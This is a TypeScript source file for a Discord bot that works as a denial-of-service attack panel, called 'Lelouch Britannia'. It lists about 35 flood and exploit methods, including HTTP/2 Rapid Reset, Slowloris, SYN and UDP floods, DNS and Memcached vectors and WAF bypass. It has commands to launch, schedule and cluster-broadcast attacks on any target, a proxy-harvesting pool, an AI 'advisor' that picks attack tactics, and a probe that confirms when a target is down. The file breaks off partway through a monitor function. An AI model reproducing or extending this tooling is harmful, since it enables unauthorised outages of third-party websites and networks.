import {
  Client,
  GatewayIntentBits,
  REST,
  Routes,
  SlashCommandBuilder,
  ChatInputCommandInteraction,
  StringSelectMenuInteraction,
  EmbedBuilder,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
  StringSelectMenuBuilder,
  StringSelectMenuOptionBuilder,
  ComponentType,
  Events,
  PermissionFlagsBits,
  AttachmentBuilder,
  MessageFlags,
  type MessageActionRowComponentBuilder,
} from "discord.js";

/** Function that edits the live attack message — uses interaction.editReply() for
 *  proper webhook token handling (interaction replies must go through the webhook API). */
type MonitorEditFn = (opts: {
  embeds:     EmbedBuilder[];
  components: ActionRowBuilder<MessageActionRowComponentBuilder>[];
}) => Promise<unknown>;
import { BOT_TOKEN, APPLICATION_ID, ALL_GUILD_IDS, COLORS, AUTHOR, BOT_NAME, API_BASE } from "./config.js";
import { api, type ScheduledAttack, type AiAdvice, type ProxyStats } from "./api.js";
import {
  getLogChannelId, setLogChannelId,
  isOwner, isMod,
  addPanelOwner, removePanelOwner, addPanelMod, removePanelMod,
  listPanelOwners, listPanelMods,
  BOOTSTRAP_OWNER_USERNAME,
} from "./bot-config.js";
import { askLelouch, askLelouchModerate, clearLelouchHistory, getLelouchMemoryStats, getSessionTimeRemaining } from "./lelouch-ai.js";
import {
  buildAttackEmbed,
  buildStartEmbed,
  buildStopEmbed,
  buildListEmbed,
  buildStatsEmbed,
  buildAnalyzeEmbed,
  buildMethodsEmbed,
  buildMethodsNavRow,
  METHODS_PAGE_SIZE,
  buildHelpEmbed,
  buildErrorEmbed,
  buildGeassFiles,
  buildAttackFiles,
  buildClusterEmbed,
  buildInfoEmbed,
  buildFinishEmbed,
  buildLangRow,
  type ProbeResult,
} from "./embeds.js";

// ── Per-interaction cache for language toggle re-render ───────────────────────
import type { AnalyzeResult, Method } from "./api.js";
const analyzeCache = new Map<string, AnalyzeResult>();
const methodsCache = new Map<string, { methods: Method[]; layer?: string; page: number; lang: "en" | "pt" }>();
type StatsCache = { stats: Parameters<typeof buildStatsEmbed>[0]; proxyStats?: Parameters<typeof buildStatsEmbed>[1] };
const statsCache  = new Map<string, StatsCache>();
const listCache   = new Map<string, Parameters<typeof buildListEmbed>[0]>();

if (!BOT_TOKEN) {
  console.error("❌ DISCORD_BOT_TOKEN is not set. Set it in the environment variables.");
  process.exit(1);
}

// ── Method definitions with layer grouping for the select menu ──────────────
const METHOD_OPTIONS = [
  // ── Geass / Special ────────────────────────────────────────────────────
  { value: "geass-override",      label: "👁️ Geass Override ∞ [ARES 35v]",    description: "MAX POWER — 35 vectors: ConnFlood+Slow+H2RST+H2CONT+HPACK+WAF+WS+GQL+RUDY2+Cache+HTTPBypass+KAExhaust+H2Storm+Pipeline+H2Ping+Smuggling+TLSRenego+SSLDeath+QUIC+XMLBomb+SlowRead+RangeFlood+AppSmart+LHBomb+H2Prio+SYN+ICMP+DNS+NTP+Mem+SSDP+UDP+DoH+gRPC+H2Pri", emoji: "👁️" },
  // ── L7 Application ─────────────────────────────────────────────────────
  { value: "waf-bypass",          label: "🟣 Geass WAF Bypass ∞",            description: "JA3+AKAMAI Chrome fingerprint — evades Cloudflare/Akamai WAF",                     emoji: "🟣" },
  { value: "http2-flood",         label: "⚡ HTTP/2 Rapid Reset",             description: "CVE-2023-44487 — 512-stream RST burst per session, millions req/s",               emoji: "⚡" },
  { value: "http2-continuation",  label: "💀 H2 CONTINUATION (CVE-2024)",    description: "CVE-2024-27316 — endless CONTINUATION frames, nginx/Apache OOM — NO patch for nginx ≤1.25.4", emoji: "💀" },
  { value: "hpack-bomb",          label: "🧨 HPACK Bomb (RFC 7541)",         description: "Incremental-indexed headers → HPACK table eviction storm — no CVE, no fix",        emoji: "🧨" },
  { value: "h2-settings-storm",   label: "🌊 H2 Settings Storm",             description: "SETTINGS oscillation + WINDOW_UPDATE flood — 3-layer H2 CPU+memory drain",         emoji: "🌊" },
  { value: "http-pipeline",       label: "🚇 HTTP Pipeline Flood",            description: "HTTP/1.1 keep-alive pipelining — 128 reqs per TCP write, no wait, 300K req/s",      emoji: "🚇" },
  { value: "ws-flood",            label: "🕸️ WebSocket Exhaustion",          description: "Holds thousands of WS conns open — goroutine/thread per conn",                     emoji: "🕸️" },
  { value: "cache-poison",        label: "☠️ CDN Cache Poisoning DoS",       description: "Fills CDN cache with unique keys — 100% origin miss rate eviction",                emoji: "☠️" },
  { value: "slowloris",           label: "🐌 Slowloris",                     description: "25K half-open connections — starves nginx/apache thread pool",                     emoji: "🐌" },
  { value: "conn-flood",          label: "🔗 TLS Connection Flood",           description: "Opens & holds thousands of TLS sockets — pre-HTTP exhaustion",                     emoji: "🔗" },
  { value: "tls-renego",          label: "🔐 TLS Renegotiation DoS",         description: "Forces TLS 1.2 renegotiation — expensive public-key CPU per conn",                 emoji: "🔐" },
  { value: "rudy-v2",             label: "🩸 RUDY v2 — Multipart SlowPOST", description: "multipart/form-data + 70-char boundary — holds server threads, harder to detect",  emoji: "🩸" },
  { value: "http-flood",          label: "🌊 HTTP Flood",                     description: "High-volume HTTP GET — overwhelms web server resources directly",                  emoji: "🌊" },
  { value: "http-bypass",         label: "🛡️ HTTP Bypass",                  description: "Chrome-fingerprinted 3-layer: fetch+Chrome headers+slow drain — defeats WAF/CDN",  emoji: "🛡️" },
  // ── L4 Transport ───────────────────────────────────────────────────────
  { value: "quic-flood",          label: "⚡ QUIC/HTTP3 Flood (RFC 9000)",   description: "QUIC Initial packets — server allocates crypto state per DCID → OOM",             emoji: "⚡" },
  { value: "ssl-death",           label: "💀 SSL Death Record",               description: "1-byte TLS records — 40K AES-GCM decrypts/sec on server CPU",                    emoji: "💀" },
  { value: "udp-flood",           label: "💥 UDP Flood",                     description: "Raw UDP packet flood — saturates L4 bandwidth (setInterval burst engine)",        emoji: "💥" },
  { value: "syn-flood",           label: "🔌 SYN Flood",                     description: "TCP SYN_RECV exhaustion — fills connection table pre-handshake",                  emoji: "🔌" },
  { value: "tcp-flood",           label: "📡 TCP Flood",                     description: "Raw TCP packet flood against open ports",                                          emoji: "📡" },
  // ── L3 Network ─────────────────────────────────────────────────────────
  { value: "icmp-flood",          label: "🔴 ICMP Flood [3-tier engine]",    description: "Real ICMP: Tier1 raw-socket (CAP_NET_RAW), Tier2 hping3, Tier3 UDP saturation burst (always works)", emoji: "🔴" },
  { value: "ntp-amp",             label: "🕐 NTP Flood [mode7+mode3]",       description: "Real NTP binary protocol — mode7 monlist (CVE-2013-5211) + mode3 to port 123 direct flood", emoji: "🕐" },
  { value: "dns-amp",             label: "📛 DNS Water Torture [CDN-bypass]", description: "Floods NS servers with random subdomains — bypasses Cloudflare/CDN entirely, NS servers unprotected", emoji: "📛" },
  { value: "mem-amp",             label: "💾 Memcached UDP Flood [binary]",  description: "Real Memcached binary protocol UDP — get+stats to port 11211, exposed servers common", emoji: "💾" },
  { value: "ssdp-amp",            label: "📡 SSDP M-SEARCH Flood [UPnP]",   description: "Real SSDP protocol to port 1900 — rotates ST targets, random CPFN header, UPnP stack exhaustion", emoji: "📡" },
  // ── ARES OMNIVECT ∞ — Advanced Vectors ────────────────────────────────
  { value: "slow-read",           label: "🐌 Slow Read — TCP Buffer Exhaust",         description: "Pauses TCP recv window — server send buffer fills, all threads block on write",                   emoji: "🐌" },
  { value: "range-flood",         label: "📐 Range Flood — 500× I/O",                 description: "500 byte-range sub-requests per req — server disk/IO seek queue exhausted",                        emoji: "📐" },
  { value: "xml-bomb",            label: "💾 XML Bomb — Billion Laughs XXE",           description: "Nested XML entity expansion — parser OOM crash on any SOAP/XMLRPC endpoint",                      emoji: "💾" },
  { value: "h2-ping-storm",       label: "🏓 H2 PING Storm — RFC 7540 §6.7",          description: "10K PING frames/sec per conn — server must ACK every one; CPU + queue exhaustion",              emoji: "🏓" },
  { value: "http-smuggling",      label: "🎭 HTTP Request Smuggling — TE/CL Desync",  description: "Transfer-Encoding/Content-Length desync — poisons backend request queue permanently",           emoji: "🎭" },
  { value: "doh-flood",           label: "🌐 DoH Flood — DNS-over-HTTPS Exhaust",     description: "Wire-format DNS queries via HTTPS — exhausts recursive resolver thread pool",                    emoji: "🌐" },
  { value: "keepalive-exhaust",   label: "⛓️ Keepalive Exhaust — 128-Req Pipeline",  description: "128-request pipeline per conn held open 15–30s — MaxKeepAliveRequests saturation",             emoji: "⛓️" },
  { value: "app-smart-flood",     label: "🎯 App Smart Flood — DB Query Exhaust",     description: "POSTs to /login /search /checkout with random data — forces uncacheable DB query per request",   emoji: "🎯" },
  { value: "large-header-bomb",   label: "💣 Large Header Bomb — 16KB Overflow",      description: "16KB of randomized headers per request — exhausts HTTP parser buffer allocation on server",       emoji: "💣" },
  { value: "http2-priority-storm",label: "🌀 H2 PRIORITY Storm — Stream Reorder",     description: "PRIORITY frames force server to rebuild stream dependency tree per frame — CPU + heap OOM",       emoji: "🌀" },
];

// ── Duration presets ─────────────────────────────────────────────────────────
const DURATION_OPTIONS = [
  { value: "30",   label: "30 seconds",   description: "Quick burst test" },
  { value: "60",   label: "1 minute",     description: "Standard attack (default)" },
  { value: "120",  label: "2 minutes",    description: "Extended pressure" },
  { value: "300",  label: "5 minutes",    description: "Sustained assault" },
  { value: "600",  label: "10 minutes",   description: "Maximum duration" },
];

// ── Thread presets ───────────────────────────────────────────────────────────
const THREAD_OPTIONS = [
  { value: "50",   label: "50 threads",   description: "Low — test only" },
  { value: "100",  label: "100 threads",  description: "Medium" },
  { value: "200",  label: "200 threads",  description: "High (default)" },
  { value: "500",  label: "500 threads",  description: "Very High" },
  { value: "1000", label: "1000 threads", description: "Maximum" },
];

// ── Pending launcher sessions (userId → { target, duration, threads }) ───────
interface LaunchSession { target: string; duration: number; threads: number; }
const pendingSessions  = new Map<string, LaunchSession>();
const sessionTimers    = new Map<string, NodeJS.Timeout>();

// ── Attack cooldown — 30s between /attack start per user ──────────────────
const ATTACK_COOLDOWN_MS = 30_000;
const attackCooldowns = new Map<string, number>(); // userId → lastLaunchTimestamp

// ── Cooldown map GC — runs every 10min to prevent unbounded growth ──────────
setInterval(() => {
  const now = Date.now();
  for (const [uid, ts] of attackCooldowns) if (now - ts > ATTACK_COOLDOWN_MS * 10) attackCooldowns.delete(uid);
  for (const [uid] of pendingSessions) if (!sessionTimers.has(uid)) pendingSessions.delete(uid);
}, 10 * 60 * 1000).unref();

const SESSION_TTL_MS = 5 * 60 * 1000; // 5 minutes

function clearSession(userId: string): void {
  pendingSessions.delete(userId);
  pendingMethodMap.delete(userId);
  const t = sessionTimers.get(userId);
  if (t) { clearTimeout(t); sessionTimers.delete(userId); }
}

function scheduleSessionExpiry(userId: string): void {
  const existing = sessionTimers.get(userId);
  if (existing) clearTimeout(existing);
  const t = setTimeout(() => {
    pendingSessions.delete(userId);
    pendingMethodMap.delete(userId);
    sessionTimers.delete(userId);
  }, SESSION_TTL_MS);
  sessionTimers.set(userId, t);
}

// ── Slash Command Definitions ─────────────────────────────────────────────────
const COMMANDS = [
  new SlashCommandBuilder()
    .setName("attack")
    .setDescription("⚔️ Geass Attack Control — launch, stop, and monitor attacks")
    .addSubcommand(sub =>
      sub.setName("start")
        .setDescription("🔴 Launch a new Geass command — opens method/duration/thread selector")
        .addStringOption(opt =>
          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("stop")
        .setDescription("⏹️ Stop a running attack by ID")
        .addIntegerOption(opt =>
          opt.setName("id").setDescription("Attack ID to stop").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 List all active and recent attacks")
    )
    .addSubcommand(sub =>
      sub.setName("stats")
        .setDescription("📊 Show global aggregate attack statistics")
    ),

  new SlashCommandBuilder()
    .setName("analyze")
    .setDescription("🔍 Analyze a target and get vulnerability recommendations")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP to analyze").setRequired(true)
    ),

  new SlashCommandBuilder()
    .setName("methods")
    .setDescription("⚡ List all available attack vectors")
    .addStringOption(opt =>
      opt.setName("layer")
        .setDescription("Filter by network layer")
        .setRequired(false)
        .addChoices(
          { name: "L7 — Application layer (HTTP, HTTP/2, Slowloris)", value: "L7" },
          { name: "L4 — Transport layer (TCP, UDP, SYN)",             value: "L4" },
          { name: "L3 — Network layer (ICMP, amplification)",         value: "L3" },
        )
    ),

  new SlashCommandBuilder()
    .setName("info")
    .setDescription("👁️ Lelouch Britannia — platform info, full cluster infrastructure & live stats (EN/PT)"),

  new SlashCommandBuilder()
    .setName("help")
    .setDescription("❓ Show Lelouch Britannia command guide"),

  new SlashCommandBuilder()
    .setName("cluster")
    .setDescription("🌐 Cluster node management — check health and broadcast Geass to all nodes")
    .addSubcommand(sub =>
      sub.setName("status")
        .setDescription("🔍 Check health and latency of all configured cluster nodes")
    )
    .addSubcommand(sub =>
      sub.setName("broadcast")
        .setDescription("👁️ Fire Geass Override ∞ to ALL cluster nodes simultaneously (10× power)")
        .addStringOption(opt =>
          opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
        )
        .addIntegerOption(opt =>
          opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
        )
        .addIntegerOption(opt =>
          opt.setName("threads").setDescription("Base thread count per node (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
        )
    ),

  new SlashCommandBuilder()
    .setName("geass")
    .setDescription("👁️ Launch Geass Override ∞ — ARES OMNIVECT maximum power, 21 simultaneous real attack vectors")
    .addStringOption(opt =>
      opt.setName("target").setDescription("Target URL or IP (e.g. https://example.com)").setRequired(true)
    )
    .addIntegerOption(opt =>
      opt.setName("duration").setDescription("Duration in seconds (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
    )
    .addIntegerOption(opt =>
      opt.setName("threads").setDescription("Base thread count (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
    ),

  new SlashCommandBuilder()
    .setName("lelouch")
    .setDescription("👁️ Fale com Lelouch vi Britannia — IA com personalidade completa do anime")
    .addSubcommand(sub =>
      sub.setName("ask")
        .setDescription("💬 Faça uma pergunta ou pedido ao Lelouch (qualquer assunto)")
        .addStringOption(opt =>
          opt.setName("message").setDescription("Sua mensagem para Lelouch").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("draw")
        .setDescription("🎨 Gere uma imagem com o Geass de Lelouch — qualquer coisa que imaginar")
        .addStringOption(opt =>
          opt.setName("prompt").setDescription("O que você quer que o Geass crie?").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("style")
            .setDescription("Estilo visual (padrão: Code Geass dark art)")
            .setRequired(false)
            .addChoices(
              { name: "🎌 Code Geass — dark anime art (padrão)", value: "geass" },
              { name: "📸 Realista — fotorrealista de alta qualidade", value: "realistic" },
              { name: "◾ Minimal — design limpo e moderno", value: "minimal" },
            )
        )
        .addStringOption(opt =>
          opt.setName("size")
            .setDescription("Formato da imagem")
            .setRequired(false)
            .addChoices(
              { name: "⬜ 1024×1024 — quadrado (padrão)", value: "1024x1024" },
              { name: "🖥️ 1536×1024 — paisagem / widescreen", value: "1536x1024" },
              { name: "📱 1024×1536 — retrato / vertical", value: "1024x1536" },
            )
        )
    )
    .addSubcommand(sub =>
      sub.setName("reset")
        .setDescription("🔄 Limpar histórico de conversa — começar do zero")
    )
    .addSubcommand(sub =>
      sub.setName("memory")
        .setDescription("🧠 Ver o que Lelouch aprendeu — base de conhecimento global")
    )
    .addSubcommand(sub =>
      sub.setName("moderate")
        .setDescription("⚖️ Tribunal do Geass — Lelouch julga um usuário com base nas evidências")
        .addUserOption(opt =>
          opt.setName("user").setDescription("O suspeito a ser julgado").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("evidence").setDescription("Evidências / comportamento observado").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("context").setDescription("Contexto adicional (histórico, reincidência, etc.)").setRequired(false)
        )
    )
    .addSubcommand(sub =>
      sub.setName("serverstats")
        .setDescription("📊 Inteligência do Servidor — análise completa do reino")
    ),

  // ── /schedule ─────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("schedule")
    .setDescription("⏰ Agendar um ataque para disparar em horário futuro")
    .addSubcommand(sub =>
      sub.setName("add")
        .setDescription("➕ Criar novo ataque agendado")
        .addStringOption(opt =>
          opt.setName("target").setDescription("URL ou IP do alvo").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("when").setDescription("Horário ISO 8601 (ex: 2026-04-16T14:00:00Z)").setRequired(true)
        )
        .addStringOption(opt =>
          opt.setName("method").setDescription("Método de ataque (default: geass-override)").setRequired(false)
        )
        .addIntegerOption(opt =>
          opt.setName("duration").setDescription("Duração em segundos (default: 60)").setRequired(false).setMinValue(5).setMaxValue(3600)
        )
        .addIntegerOption(opt =>
          opt.setName("threads").setDescription("Threads (default: 200)").setRequired(false).setMinValue(1).setMaxValue(2000)
        )
    )
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 Listar ataques agendados pendentes")
    )
    .addSubcommand(sub =>
      sub.setName("cancel")
        .setDescription("✕ Cancelar um ataque agendado")
        .addStringOption(opt =>
          opt.setName("id").setDescription("ID do agendamento (sched_...)").setRequired(true)
        )
    ),

  // ── /advisor ──────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("advisor")
    .setDescription("🧠 Lelouch AI Advisor — análise táctica com Groq llama-3.3-70b")
    .addStringOption(opt =>
      opt.setName("target").setDescription("URL ou IP para analisar").setRequired(true)
    ),

  // ── /proxy ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("proxy")
    .setDescription("🌐 Gestão do pool de proxies automático")
    .addSubcommand(sub =>
      sub.setName("stats").setDescription("📊 Ver estatísticas do pool de proxies")
    )
    .addSubcommand(sub =>
      sub.setName("refresh").setDescription("🔄 Forçar re-harvest de proxies agora (22 fontes)")
    ),

  // ── /stats ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("stats")
    .setDescription("📡 Server health — uptime, RAM, CPU load, active attacks"),

  // ── /admin ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("admin")
    .setDescription("👁️ Lelouch Kingdom Administration — moderation commands")
    .setDefaultMemberPermissions(PermissionFlagsBits.ManageMessages)
    .addSubcommand(sub =>
      sub.setName("ban")
        .setDescription("⚔️ Banish a subject from the kingdom")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to banish").setRequired(true))
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for banishment").setRequired(false))
    )
    .addSubcommand(sub =>
      sub.setName("unban")
        .setDescription("🕊️ Grant pardon — restore access to a banished subject")
        .addStringOption(opt => opt.setName("userid").setDescription("User ID to unban").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("clear")
        .setDescription("🗑️ Erase evidence — delete messages from this channel")
        .addIntegerOption(opt =>
          opt.setName("amount").setDescription("Number of messages to delete (1–100)").setRequired(true).setMinValue(1).setMaxValue(100)
        )
    )
    .addSubcommand(sub =>
      sub.setName("warn")
        .setDescription("⚠️ Issue a Geass warning to a subject")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to warn").setRequired(true))
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for warning").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("mute")
        .setDescription("🔇 Silence a subject by Geass command")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to silence").setRequired(true))
        .addIntegerOption(opt =>
          opt.setName("duration").setDescription("Timeout duration in minutes (1–10080)").setRequired(false).setMinValue(1).setMaxValue(10080)
        )
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for silencing").setRequired(false))
    )
    .addSubcommand(sub =>
      sub.setName("unmute")
        .setDescription("🔊 Restore voice to a silenced subject")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to restore voice").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("kick")
        .setDescription("👢 Expel a subject — they may return unlike a ban")
        .addUserOption(opt => opt.setName("user").setDescription("Subject to expel").setRequired(true))
        .addStringOption(opt => opt.setName("reason").setDescription("Reason for expulsion").setRequired(false))
    )
    .addSubcommand(sub =>
      sub.setName("slowmode")
        .setDescription("🐢 Set slow mode delay on the current channel")
        .addIntegerOption(opt =>
          opt.setName("seconds").setDescription("Delay in seconds (0 = disable, max 21600)").setRequired(true).setMinValue(0).setMaxValue(21600)
        )
    )
    .addSubcommand(sub =>
      sub.setName("logchannel")
        .setDescription("📋 Set the channel where all mod actions are logged")
        .addChannelOption(opt =>
          opt.setName("channel").setDescription("Channel to send mod logs to").setRequired(true)
        )
    ),

  // ── /panel ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("panel")
    .setDescription("👁️ Painel de Controle Real — acesso exclusivo ao dono e autorizados")
    .addSubcommand(sub =>
      sub.setName("status")
        .setDescription("📊 Status do bot — CPU, RAM, sessões, guilds, uptime")
    )
    .addSubcommand(sub =>
      sub.setName("guilds")
        .setDescription("🌐 Listar todos os servidores onde o bot está")
    )
    .addSubcommand(sub =>
      sub.setName("whitelist")
        .setDescription("📋 Gerenciar whitelist de acesso ao painel")
        .addStringOption(opt =>
          opt.setName("action")
            .setDescription("Ação").setRequired(true)
            .addChoices(
              { name: "➕ Adicionar owner",   value: "add-owner" },
              { name: "➕ Adicionar mod",     value: "add-mod"   },
              { name: "➖ Remover acesso",    value: "remove"    },
              { name: "📋 Listar acessos",    value: "list"      },
            )
        )
        .addUserOption(opt =>
          opt.setName("user").setDescription("Usuário alvo").setRequired(false)
        )
    )
    .addSubcommand(sub =>
      sub.setName("broadcast")
        .setDescription("📢 Enviar mensagem para TODOS os canais de log configurados")
        .addStringOption(opt =>
          opt.setName("message").setDescription("Mensagem a enviar").setRequired(true)
        )
    )
    .addSubcommand(sub =>
      sub.setName("leave")
        .setDescription("🚪 Forçar bot a sair de um servidor específico")
        .addStringOption(opt =>
          opt.setName("guildid").setDescription("ID do servidor").setRequired(true)
        )
    ),

  // ── /whois ────────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("whois")
    .setDescription("🔍 Geass Intelligence — dossier completo: identidade, cargos, permissões, risco e mais")
    .addUserOption(opt =>
      opt.setName("user").setDescription("O sujeito a investigar (padrão: você mesmo)").setRequired(false)
    )
    .addBooleanOption(opt =>
      opt.setName("private").setDescription("Resposta visível apenas para você? (padrão: não)").setRequired(false)
    ),

  // ── /admins ───────────────────────────────────────────────────────────────
  new SlashCommandBuilder()
    .setName("admins")
    .setDescription("👑 Painel de Administradores — gerenciar owners e admins do bot (owner only)")
    .addSubcommand(sub =>
      sub.setName("list")
        .setDescription("📋 Ver todos os owners e admins autorizados")
    )
    .addSubcommand(sub =>
      sub.setName("add-owner")
        .setDescription("➕ Promover usuário a owner (acesso total) — apenas bootstrap owner")
        .addUserOption(opt => opt.setName("user").setDescription("Usuário a promover").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("add-admin")
        .setDescription("➕ Adicionar admin autorizado — owner only")
        .addUserOption(opt => opt.setName("user").setDescription("Usuário a adicionar como admin").setRequired(true))
    )
    .addSubcommand(sub =>
      sub.setName("remove")
        .setDescription("➖ Remover owner ou admin — owner only")
        .addUserOption(opt => opt.setName("user").setDescription("Usuário a remover").setRequired(true))
    ),

].map(c => c.toJSON());

// ── Deploy slash commands ─────────────────────────────────────────────────────
async function deployCommands(): Promise<void> {
  const rest = new REST().setToken(BOT_TOKEN);
  // Non-fatal — a registration failure should NEVER bring down the bot.
  // Commands registered in a previous run remain valid; the bot keeps running.
  try {
    // ── Step 1: Wipe global commands ─────────────────────────────────────────
    // Global commands + guild commands shown simultaneously = duplicates in Discord UI.
    // Solution: keep ONLY guild-scoped commands (instant propagation, no duplicates).
    await rest.put(Routes.applicationCommands(APPLICATION_ID), { body: [] });
    console.log("🧹 Cleared global application commands (preventing duplicates).");

    // ── Step 2: Register per-guild (instant propagation, no duplication) ──────
    for (const gid of ALL_GUILD_IDS) {
      await rest.put(Routes.applicationGuildCommands(APPLICATION_ID, gid), { body: COMMANDS });
      console.log(`✅ Registered ${COMMANDS.length} commands to guild ${gid}.`);
    }
  } catch (err) {
    // Log but do NOT throw — bot will still start with previously registered commands
    console.warn("⚠️ Command registration failed (non-fatal — using cached commands):", err);
  }
}

// ── Target probe helper ───────────────────────────────────────────────────────
async function probeTarget(rawUrl: string): Promise<ProbeResult> {
  let url = rawUrl.trim();
  if (!/^https?:\/\//i.test(url)) url = `https://${url}`;
  const t0 = Date.now();
  try {
    // 5s timeout — must be less than INTERVAL_SEC to prevent stacking
    const ctrl  = new AbortController();
    const timer = setTimeout(() => ctrl.abort(), 5000);
    const res   = await fetch(url, {
      method:   "GET",
      redirect: "follow",
      signal:   ctrl.signal,
      headers:  {
        "User-Agent":      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "Accept":          "text/html,application/xhtml+xml,*/*;q=0.8",
        "Accept-Encoding": "gzip, deflate, br",
        "Cache-Control":   "no-cache",
      },
    });
    clearTimeout(timer);
    const latencyMs = Date.now() - t0;
    if (res.status >= 500) {
      return { up: false, latencyMs, reason: `HTTP ${res.status} — origin server error` };
    }
    if (res.status === 429) {
      // 429 = server is alive but ratelimiting — count as UP (degraded)
      return { up: true, latencyMs: latencyMs + 5000, reason: `HTTP 429 — rate limiter hit (server alive, fighting back)` };
    }
    return { up: true, latencyMs };
  } catch (err: unknown) {
    const latencyMs = Date.now() - t0;
    const msg = err instanceof Error ? err.message : String(err);

    // ECONNREFUSED = server actively rejected → definitely crashed
    if (msg.includes("ECONNREFUSED") || msg.includes("refused")) {
      return { up: false, latencyMs, reason: "Connection refused — server process crashed" };
    }
    // ENOTFOUND/NXDOMAIN = DNS gone → target unreachable
    if (msg.includes("ENOTFOUND") || msg.includes("NXDOMAIN")) {
      return { up: false, latencyMs, reason: "DNS resolution failed — target unreachable" };
    }
    // AbortError = our probe timed out (may be our network saturated or target slow)
    if (msg.includes("abort") || msg.includes("AbortError") || msg.includes("The operation was aborted")) {
      // Treat as degraded but NOT confirmed down — attack traffic may saturate our own outbound
      return { up: true, latencyMs: 5001, reason: "Probe timed out — target slow or our network saturated" };
    }
    // ECONNRESET = TCP RST received (can be our side too under load)
    if (msg.includes("ECONNRESET") || msg.includes("reset")) {
      return { up: true, latencyMs: 4500, reason: "Connection reset — possible overflow (check site)" };
    }
    // Generic "fetch failed" / "TypeError" = our network stack is overwhelmed by attack traffic
    // Do NOT count as target DOWN — this is a probe false positive during heavy attacks
    return { up: true, latencyMs: 5500, reason: "Probe inconclusive — outbound network under load" };
  }
}

// ── Live attack monitor ───────────────────────────────────────────────────────
const monitors        = new Map<number, NodeJS.Timeout>();
const prevPackets     = new Map<number, number>();
const targetHistories = new Map<number, ProbeResult[]>();
const downAlertSent   = new Map<number, boolean>(); // prevent DM spam

// Module-level client ref (set in main()) for DM support
let botClient: Client | null = null;

// ═══════════════════════════════════════════════════════════════════════════
// PAGINATION HELPER — Arrow-button embed pager (5 min TTL)
// ═══════════════════════════════════════════════════════════════════════════
async function sendPaginated(
  interaction: ChatInputCommandInteraction,
  pages: EmbedBuilder[],
  options: { timeoutMs?: number; ephemeral?: boolean } = {},
): Promise<void> {
  const { timeoutMs = 300_000, ephemeral = false } = options;
  if (pages.length === 0) return;
  if (pages.length === 1) {
    await interaction.editReply({ embeds: [pages[0]], components: [] });
    return;
  }

  let page = 0;

  const buildRow = (disabled = false) => new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("pg_first")
      .setLabel("⏮️")
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(disabled || page === 0),
    new ButtonBuilder()
      .setCustomId("pg_prev")
      .setLabel("◀️")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(disabled || page === 0),
    new ButtonBuilder()
      .setCustomId("pg_indicator")
      .setLabel(`${page + 1} / ${pages.length}`)
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(true),
    new ButtonBuilder()
      .setCustomId("pg_next")
      .setLabel("▶️")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(disabled || page === pages.length - 1),
    new ButtonBuilder()
      .setCustomId("pg_last")
      .setLabel("⏭️")
      .setStyle(ButtonStyle.Secondary)
      .setDisabled(disabled || page === pages.length - 1),
  );

  const msg = await interaction.editReply({
    embeds: [pages[page]],
    components: [buildRow()],
  });

  const collector = msg.createMessageComponentCollector({
    componentType: ComponentType.Button,
    filter: (btn) => btn.user.id === interaction.user.id && btn.customId.startsWith("pg_"),
    time: timeoutMs,
  });

  collector.on("collect", async (btn) => {
    if (btn.customId === "pg_first")     page = 0;
    else if (btn.customId === "pg_prev") page = Math.max(0, page - 1);
    else if (btn.customId === "pg_next") page = Math.min(pages.length - 1, page + 1);
    else if (btn.customId === "pg_last") page = pages.length - 1;

    await btn.update({
      embeds: [pages[page]],
      components: [buildRow()],
    });
  });

  collector.on("end", async () => {
    try {
      await interaction.editReply({ components: [buildRow(true)] });
    } catch { /* expired */ }
  });
}

function buildAttackButtons(attackId: number, running: boolean): ActionRowBuilder<ButtonBuilder> {
  return new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId(`stop_${attackId}`)
      .setLabel("⏹️ Stop Attack")
      .setStyle(ButtonStyle.Danger)
      .setDisabled(!running),
    new ButtonBuilder()
      .setCustomId(`extend_${attackId}`)
      .setLabel("⏱️ Extend +60s")
      .setStyle(ButtonStyle.Primary)
      .setDisabled(!running),
  );
}

function startMonitor(attackId: number, editFn: MonitorEditFn, target: string, userId?: string, channelId?: string): void {
  if (monitors.has(attackId)) return;

